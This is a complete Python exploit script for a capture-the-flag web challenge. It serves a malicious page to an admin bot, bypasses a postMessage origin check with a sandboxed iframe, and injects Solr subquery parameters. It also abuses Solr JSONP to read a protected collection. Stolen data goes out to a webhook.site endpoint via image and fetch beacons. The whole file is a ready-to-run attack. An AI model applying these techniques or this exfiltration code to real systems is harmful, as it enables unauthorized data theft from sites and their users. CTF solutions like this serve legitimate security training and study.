#!/usr/bin/env python3
"""
FlyteRadar365 - Eclipse Chaser CTF Exploit
upCTF 2026 - Web

Confirmed working locally.

Attack chain:
1. Host exploit page on HTTP server (accessible from bot's Docker network)
2. Submit exploit URL via /api/report -> bot visits our page
3. Two parallel attack vectors:
   a) Sandbox origin bypass: postMessage to admin.html with Solr subquery injection
   b) JSONP fallback: direct <script> tag to Solr with json.wrf callback
4. Exfiltrate flag to webhook.site

Vulnerabilities:
- postMessage origin check bypass via sandbox="allow-scripts" (null === null)
- Solr parameter injection in /api/admin/search (query embedded in URL unescaped)
- "collection" filter bypass: /[?&]collection/i doesn't match "flagdata.collection"
- Solr [subquery] transformer reads across collections
- Solr json.wrf JSONP enables cross-origin data exfiltration
"""

import sys
import re
import time
import json
import threading
import http.server
import urllib.parse
import requests

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <CHALLENGE_URL> [LISTEN_IP] [LISTEN_PORT]")
    print(f"  For local:  {sys.argv[0]} http://localhost:20011 172.18.0.1 9999")
    print(f"  For remote: {sys.argv[0]} http://HOST:PORT <YOUR_PUBLIC_IP> 9999")
    sys.exit(1)

CHALLENGE_URL = sys.argv[1].rstrip('/')
LISTEN_IP = sys.argv[2] if len(sys.argv) > 2 else '172.18.0.1'
LISTEN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 9999

INTERNAL_WEB = 'http://ctf-web:8080'
EXPLOIT_URL = f'http://{LISTEN_IP}:{LISTEN_PORT}/exploit.html'

# Solr subquery injection - bypasses "collection" filter
SOLR_QUERY = '*:*&fl=id,flagdata:[subquery]&flagdata.q=*:*&flagdata.collection=flag&wt=json'

# Create webhook
print("[*] Creating webhook.site token...")
try:
    r = requests.post('https://webhook.site/token', headers={'Accept': 'application/json'}, timeout=10)
    WEBHOOK_UUID = r.json()['uuid']
except Exception as e:
    print(f"[-] Webhook creation failed: {e}")
    sys.exit(1)

WEBHOOK_URL = f'https://webhook.site/{WEBHOOK_UUID}'
WEBHOOK_API = f'https://webhook.site/token/{WEBHOOK_UUID}/requests'


def build_exploit_html():
    return f'''<!DOCTYPE html>
<html><body>
<h1 id="s">Loading...</h1><pre id="o"></pre>
<script>
var WH='{WEBHOOK_URL}';
var INTERNAL='{INTERNAL_WEB}';
var Q='{SOLR_QUERY}';

window.addEventListener('message',function(ev){{
  var d=typeof ev.data==='string'?ev.data:JSON.stringify(ev.data);
  document.getElementById('o').innerText+=d+'\\n';
  new Image().src=WH+'?d='+encodeURIComponent(d.substring(0,1500));
  fetch(WH+'?f='+encodeURIComponent(d.substring(0,1500)),{{mode:'no-cors'}});
}});

// Attack 1: Sandbox origin bypass + postMessage + Solr subquery injection
var sc='<iframe id="t" src="'+INTERNAL+'/admin.html" style="display:none"><\\/iframe>'
+'<scr'+'ipt>'
+'var t=document.getElementById("t");'
+'window.addEventListener("message",function(e){{try{{parent.postMessage(e.data,"*")}}catch(x){{}}}});'
+'function sq(){{try{{t.contentWindow.postMessage({{q:"'+Q+'"}},"*")}}catch(x){{}}}}'
+'setTimeout(sq,2000);setTimeout(sq,4000);setTimeout(sq,6000);'
+'<\\/scr'+'ipt>';
var sf=document.createElement('iframe');
sf.sandbox='allow-scripts';
sf.srcdoc=sc;
sf.style.cssText='width:1px;height:1px;border:none';
document.body.appendChild(sf);

// Attack 2: JSONP fallback - direct Solr read
window.steal=function(data){{
  var d=JSON.stringify(data);
  new Image().src=WH+'?jsonp='+encodeURIComponent(d.substring(0,1500));
}};
setTimeout(function(){{
  var s=document.createElement('script');
  s.src='http://solr:8983/solr/flag/select?q=*:*&wt=json&json.wrf=steal';
  document.body.appendChild(s);
}},1000);
</script>
</body></html>'''


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if '/exploit' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(build_exploit_html().encode())
            print(f"[+] Exploit served to {self.client_address[0]}")
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *a):
        pass


def check_webhook():
    try:
        r = requests.get(f'{WEBHOOK_API}?sorting=newest', headers={'Accept': 'application/json'}, timeout=10)
        for req in r.json().get('data', []):
            qs = req.get('query', {})
            for k, v in qs.items():
                try:
                    parsed = json.loads(v)
                    # postMessage response
                    if 'data' in parsed:
                        inner = json.loads(parsed['data']) if isinstance(parsed['data'], str) else parsed['data']
                        for doc in inner.get('response', {}).get('docs', []):
                            if 'flagdata' in doc:
                                for fdoc in doc['flagdata'].get('docs', []):
                                    if 'flag' in fdoc:
                                        flag = fdoc['flag']
                                        if isinstance(flag, list): flag = flag[0]
                                        return flag
                    # JSONP response
                    if 'response' in parsed:
                        for doc in parsed['response'].get('docs', []):
                            if 'flag' in doc:
                                flag = doc['flag']
                                if isinstance(flag, list): flag = flag[0]
                                return flag
                except:
                    pass
                # Raw string search
                m = re.search(r'upCTF\{[^}]+\}', str(v))
                if m:
                    return m.group()
    except Exception as e:
        pass
    return None


if __name__ == '__main__':
    print(f"[*] Challenge:  {CHALLENGE_URL}")
    print(f"[*] Exploit:    {EXPLOIT_URL}")
    print(f"[*] Webhook:    {WEBHOOK_URL}")
    print(f"[*] Webhook UI: https://webhook.site/#!/view/{WEBHOOK_UUID}")
    print()

    # Start HTTP server
    srv = threading.Thread(target=lambda: http.server.HTTPServer(
        ('0.0.0.0', LISTEN_PORT), Handler).serve_forever(), daemon=True)
    srv.start()
    print(f"[*] HTTP server on 0.0.0.0:{LISTEN_PORT}")

    # Submit to bot
    print(f"[*] Submitting {EXPLOIT_URL} to bot...")
    try:
        r = requests.post(f'{CHALLENGE_URL}/api/report',
                         json={'url': EXPLOIT_URL}, timeout=15)
        print(f"[*] Report: {r.status_code} - {r.text}")
    except Exception as e:
        print(f"[-] Report failed: {e}")

    # Poll webhook
    print(f"[*] Polling webhook...")
    for i in range(30):
        time.sleep(2)
        flag = check_webhook()
        if flag:
            print(f"\n{'='*50}")
            print(f"[FLAG] {flag}")
            print(f"{'='*50}")
            break
        if (i+1) % 5 == 0:
            print(f"[*] Waiting... ({(i+1)*2}s)")
    else:
        print(f"\n[-] Timeout. Check webhook: https://webhook.site/#!/view/{WEBHOOK_UUID}")

    print("[*] Done. Ctrl+C to exit.")
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        pass
